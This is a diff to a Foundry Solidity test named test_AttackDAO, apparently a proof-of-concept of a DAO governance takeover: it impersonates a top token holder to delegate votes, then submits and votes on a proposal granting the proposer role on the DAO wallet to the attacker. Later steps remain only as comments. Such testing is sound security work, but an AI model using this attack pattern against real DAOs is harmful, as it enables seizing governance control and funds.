@@ -26,9 +26,6 @@ contract CounterTest is Test {
         timelock = ITimelock(0xd7A029Db2585553978190dB5E85eC724Aa4dF23f);
         daoWallet = IWallet(payable(0xFe89cc7aBB2C4183683ab71653C4cdc9B02D44b7));
 
-        vm.prank(0xd7A029Db2585553978190dB5E85eC724Aa4dF23f);
-        token.delegate(voter);
-
         labelAddresses();
     }
 
@@ -44,6 +41,15 @@ contract CounterTest is Test {
     }
 
     function test_AttackDAO() public {
+        // Delegate from top token holder
+        vm.prank(0xd7A029Db2585553978190dB5E85eC724Aa4dF23f);
+        token.delegate(voter);
+
+        // Need to advance 1 block for delegation to be valid
+        vm.roll(block.number + 1);
+
+    
+        // Creating a proposal that gives a proposer role to 
         address[] memory targets = new address[](1);
         targets[0] = address(daoWallet);
         uint256[] memory values = new uint256[](1);
@@ -51,13 +57,32 @@ contract CounterTest is Test {
         bytes[] memory calldatas = new bytes[](1);
         calldatas[0] = abi.encodeCall(daoWallet.grantRole, (daoWallet.PROPOSER_ROLE(), voter));
 
-            uint256 votingPower = token.getVotes(voter);
+        uint256 votingPower = token.getVotes(voter);
         assertEq(votingPower, 55_004_056_347_480_195_848_226_739);
         console.log(governor.proposalThreshold());
-        vm.prank(voter);
-        governor.propose(targets, values, calldatas, "");
-    }
 
+        // Governor //
+        // Submit malicious proposal
+        vm.prank(voter);
+        uint256 proposalId = governor.propose(targets, values, calldatas, "");
+
+        // Proposal is ready to vote after 1 block
+        vm.roll(block.number + 10);
+
+        // Vote for the proposal
+        vm.prank(voter);
+        governor.castVote(proposalId, 1);
+        // Let the vote end
+
+        // Queue the proposal to be executed
+        //// Test if Operation status on timelock is Pending
+
+        // Wait the operation in the DAO wallet timelock to be Ready
+
+        // DAO Wallet (Timelock) //
+
+        // To cancel the operation, the status needs to be pending and only the PROPOSAL_ROLE can call it
+    }
 
     /// @dev Labels the most relevant addresses.
     function labelAddresses() internal {
